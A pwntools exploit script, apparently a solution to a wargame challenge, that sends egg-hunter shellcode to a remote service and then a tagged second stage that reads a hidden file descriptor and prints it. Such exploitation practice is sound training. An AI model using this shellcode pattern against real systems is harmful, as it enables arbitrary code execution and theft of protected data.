# smallBuf -> 0x14 (20) bytes
# bigBuff -> 0x100 bytes

from pwn import *
import re

# p = process("./find-me")
p = remote('plsdonthaq.me', 3003)

p.recvuntil(b"new stack ")
stackAddress = int(p.recvline(keepends=False), 16)
print("Stack address:", hex(stackAddress), "->", p32(stackAddress))

assembly = f"""
mov eax, {stackAddress}   # Search from the stack address
mov ebx, 0x11223344       # Check for this signature
loop:
   inc eax                # Increment memory address
   cmp [eax-4], ebx       # Compare value at address to signature
   jne loop               # Loop if no match
   
   push eax               # Prepare jump to address eax
   ret                    # Go go go!
"""

####################################################################

payload = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))
p.sendline(payload)

assembly = f"""
   # Test our shellcode is running
   # Should return with status code 99
      # mov eax, 1
      # mov ebx, 99
      # int 0x80

   # Read from fd 1000 into the stack memory
   mov eax, 0x03             # syscall 3: read
   mov ebx, 1000             # open FD 1000
   mov ecx, {stackAddress}   # Read into stack
   mov edx, 100              # Read 100 bytes
   int 0x80                  # sycall

   # Print from the stack memory
   mov edx, eax              # Print n bytes
   mov eax, 0x04             # syscall 4: write
   mov ebx, 0x01             # fd 1: stdout
   # mov ecx, esp            # Read from stack
   int 0x80                  # syscall
"""

payload = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))
p.sendline(b"\x11\x22\x33\x44"[::-1] + payload)
p.recvuntil("jumping to smallbuf\n")
print(p.recvline(keepends=False))